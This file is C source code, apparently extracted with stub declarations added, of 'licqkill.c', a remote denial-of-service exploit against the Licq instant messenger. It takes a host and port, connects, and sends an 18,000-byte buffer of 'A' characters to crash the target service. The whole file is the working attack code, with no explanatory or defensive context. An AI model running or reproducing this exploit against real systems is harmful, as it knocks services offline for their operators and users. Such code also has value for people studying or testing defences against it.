
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int buf ;


 int AF_INET ;
 int SOCK_STREAM ;
 int atoi (char*) ;
 int close (int) ;
 int connect (int,struct sockaddr*,int) ;
 int exit (int) ;
 int fprintf (int ,char*,...) ;
 struct hostent* gethostbyname (char*) ;
 int htons (int ) ;
 int printf (char*) ;
 int send (int,char*,int,int ) ;
 int socket (int ,int ,int ) ;
 int stderr ;
 int stdout ;
 int strncat (char*,char*,int) ;

int main(int argc, char **argv)
{
 char buf[18000];
 int i, sock, result;
 struct sockaddr_in sin;
 struct hostent *hn;

 printf("licqkill.c - Licq remote DoS by Stan Bubrouski <stan@ccs.neu.edu>\n\n");

 if (argc < 3)
 {
  fprintf(stderr, "Usage: %s <host> <port>\n", argv[0]);
  exit(-1);
 }

 hn = gethostbyname(argv[1]);

 if (!hn)
 {
  fprintf(stderr, "%s: host lookup failure\n", argv[1]);
  exit(-1);
 }

 sin.sin_family = AF_INET;
 sin.sin_port = htons(atoi(argv[2]));
 sin.sin_addr = *(struct in_addr *)hn->h_addr;
 sock = socket(AF_INET, SOCK_STREAM, 0);
 result = connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));

 if (result != 0)
 {
  fprintf(stderr, "Failed to establish connection to %s\n", argv[1]);
  exit(-1);
 }

 if (sock < 0)
 {
  fprintf(stderr, "Socket error.");
  exit(-1);
 }

 for (i=0; i<18000; i++)
  strncat(buf, "A", 1);
 send(sock, buf, sizeof(buf), 0);
 close(sock);
 fprintf(stdout, "Data sent\n\n");
}
